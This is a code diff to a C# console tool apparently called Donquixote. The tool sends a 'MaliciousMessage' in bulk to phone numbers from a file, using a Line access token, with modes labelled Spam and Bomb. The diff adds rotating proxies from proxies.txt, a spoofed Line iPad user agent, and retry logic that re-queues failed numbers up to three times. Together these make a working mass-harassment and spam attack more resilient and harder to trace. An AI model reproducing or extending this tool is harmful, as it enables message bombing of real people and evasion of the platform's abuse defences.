@@ -19,18 +19,24 @@ namespace Donquixote.Models
         public string AccessToken = "";
 
         public StatusEnumModel CurrentStatus = StatusEnumModel.Setup;
+        public ConnectionEnumModel SelectedConnection = ConnectionEnumModel.Direct;
         public ModeEnumModel SelectedMode = ModeEnumModel.Spam;
         public SpeedEnumModel SelectedSpeed = SpeedEnumModel.Normal;
 
         public int MessengerRecursivity = 0;
-        public int PhonesLoaded = 0;
-        public int PhonesMessengerIndex = 0;
-        public int PhonesMessaged = 0;
-        public int PhonesSkiped = 0;
+        public int PhoneNumbersLoaded = 0;
+        public int PhoneNumbersMessengerIndex = 0;
+        public int PhoneNumbersMessaged = 0;
+        public int PhoneNumbersSkiped = 0;
+        public int ReEnqueuedPhoneNumbers = 0;
 
         public object DisplayLock = new object();
 
-        public ConcurrentQueue<PhoneDataModel> Phones = new ConcurrentQueue<PhoneDataModel>();
+        public Random RandomProxySelector = new Random((int)(DateTime.UtcNow.Subtract(new DateTime(1970, 1, 1))).TotalSeconds);
+
+        public ConcurrentQueue<PhoneDataModel> PhoneNumbers = new ConcurrentQueue<PhoneDataModel>();
+
+        public List<string> Proxies = new List<string>();
 
         public List<PhoneDataModel> MessagingFailed = new List<PhoneDataModel>();
 
@@ -43,8 +49,8 @@ namespace Donquixote.Models
         {
             var progressRate = 0f;
 
-            if (PhonesMessengerIndex > progressRate)
-                progressRate = PhonesMessengerIndex * 100 / PhonesLoaded;
+            if (PhoneNumbersMessengerIndex > progressRate)
+                progressRate = PhoneNumbersMessengerIndex * 100 / PhoneNumbersLoaded;
 
             return progressRate;
         }
@@ -59,7 +65,7 @@ namespace Donquixote.Models
                     break;
 
                 case StatusEnumModel.Attacking:
-                    Console.Title = $"Donquixote :: {CurrentStatus} | Messaged {PhonesMessengerIndex} on {PhonesLoaded} | Failed to message {MessagingFailed.Count} | {CalculateProgress()}% done";
+                    Console.Title = $"Donquixote :: {CurrentStatus} | Messaged {PhoneNumbersMessengerIndex} on {PhoneNumbersLoaded} + {ReEnqueuedPhoneNumbers} retries | Failed to message {MessagingFailed.Count} | {CalculateProgress()}% done";
                     break;
             }
         }
@@ -80,7 +86,7 @@ namespace Donquixote.Models
                             line = streamReader.ReadLine();
                         else
                         {
-                            Phones.Enqueue(
+                            PhoneNumbers.Enqueue(
                                 new PhoneDataModel()
                                 {
                                     Number = line
@@ -91,9 +97,42 @@ namespace Donquixote.Models
                     }
                 }
 
-                PhonesLoaded = Phones.Count;
+                PhoneNumbersLoaded = PhoneNumbers.Count;
 
-                if (Phones.Count > 0)
+                if (PhoneNumbers.Count > 0)
+                    return true;
+                else
+                    return false;
+            }
+            else
+                return false;
+        }
+
+        public bool ImportProxies()
+        {
+            var fileName = "proxies.txt";
+
+            if (File.Exists(fileName))
+            {
+                using (StreamReader streamReader = new StreamReader(fileName))
+                {
+                    var line = streamReader.ReadLine();
+
+                    while (line != null)
+                    {
+                        if (line.Length < 1)
+                            line = streamReader.ReadLine();
+                        else
+                        {
+
+                            Proxies.Add(line);
+
+                            line = streamReader.ReadLine();
+                        }
+                    }
+                }
+
+                if (Proxies.Count > 0)
                     return true;
                 else
                     return false;
@@ -114,9 +153,9 @@ namespace Donquixote.Models
             {
                 AttackMode = SelectedMode,
                 AttackSpeed = SelectedSpeed,
-                PhonesLoaded = PhonesLoaded,
-                PhonesMessaged = PhonesMessaged,
-                PhoneSkiped = PhonesSkiped
+                PhonesLoaded = PhoneNumbersLoaded,
+                PhonesMessaged = PhoneNumbersMessaged,
+                PhoneSkiped = PhoneNumbersSkiped
             };
 
             CurrentStatus = StatusEnumModel.Finished;
@@ -130,8 +169,8 @@ namespace Donquixote.Models
             var workerThreads = 0;
             var workingThreads = 1;
 
-            if (workingThreads > Phones.Count)
-                workingThreads = Phones.Count;
+            if (workingThreads > PhoneNumbers.Count)
+                workingThreads = PhoneNumbers.Count;
 
             ThreadPool.SetMinThreads(workingThreads, 0);
             ThreadPool.SetMaxThreads(workingThreads, 0);
@@ -165,7 +204,10 @@ namespace Donquixote.Models
                 UserAgent = "Line2/12.3 (iPad; iOS 11.2.5; Scale/2.00)",
                 Accept = "*/*",
                 AcceptEncoding = "br, gzip, deflate",
-                AcceptLanguage = "en;q=1"
+                AcceptLanguage = "en;q=1",
+                Timeout = TimeSpan.FromSeconds(6),
+                NumberOfAttempts = 3,
+                Proxy = new Proxy(Proxies[RandomProxySelector.Next(0, Proxies.Count - 1)])
             };
 
             var successSpaceCount = Console.BufferWidth - 56;
@@ -175,11 +217,11 @@ namespace Donquixote.Models
             {
                 case ModeEnumModel.Spam:
 
-                    while (!Phones.IsEmpty)
+                    while (!PhoneNumbers.IsEmpty)
                     {
-                        Phones.TryDequeue(out var phone);
+                        PhoneNumbers.TryDequeue(out var phone);
 
-                        if (phone.Number == null || phone.Number == string.Empty)
+                        if (phone.Number == null || phone.Number == string.Empty || phone.NumberOfAttempts >= 3)
                             return;
 
                         switch (MessageModel.SendMessage(client, AccessToken, phone.Number, MaliciousMessage))
@@ -191,20 +233,27 @@ namespace Donquixote.Models
                             case 1:
                                 DisplayStatus(1, phone.Number, failureSpaceCount);
 
-                                MessagingFailed.Add(phone);
+                                if (phone.NumberOfAttempts < 3)
+                                {
+                                    PhoneNumbers.Enqueue(phone);
+
+                                    ReEnqueuedPhoneNumbers++;
+                                }
+                                else
+                                    MessagingFailed.Add(phone);
                                 break;
                         }
 
-                        PhonesMessengerIndex++;
+                        PhoneNumbersMessengerIndex++;
 
                         Thread.Sleep((int)SelectedSpeed);
                     }
                     break;
 
                 case ModeEnumModel.Bomb:
-                    while (!Phones.IsEmpty)
+                    while (!PhoneNumbers.IsEmpty)
                     {
-                        Phones.TryDequeue(out var phone);
+                        PhoneNumbers.TryDequeue(out var phone);
 
                         if (phone.Number == null || phone.Number == string.Empty)
                             return;
@@ -220,14 +269,21 @@ namespace Donquixote.Models
                                 case 1:
                                     DisplayStatus(1, phone.Number, failureSpaceCount);
 
-                                    MessagingFailed.Add(phone);
+                                    if (phone.NumberOfAttempts < 3)
+                                    {
+                                        PhoneNumbers.Enqueue(phone);
+
+                                        ReEnqueuedPhoneNumbers++;
+                                    }
+                                    else
+                                        MessagingFailed.Add(phone);
                                     break;
                             }
 
                             Thread.Sleep((int)SelectedSpeed);
                         }
 
-                        PhonesMessengerIndex++;
+                        PhoneNumbersMessengerIndex++;
                     }
                     break;
             }
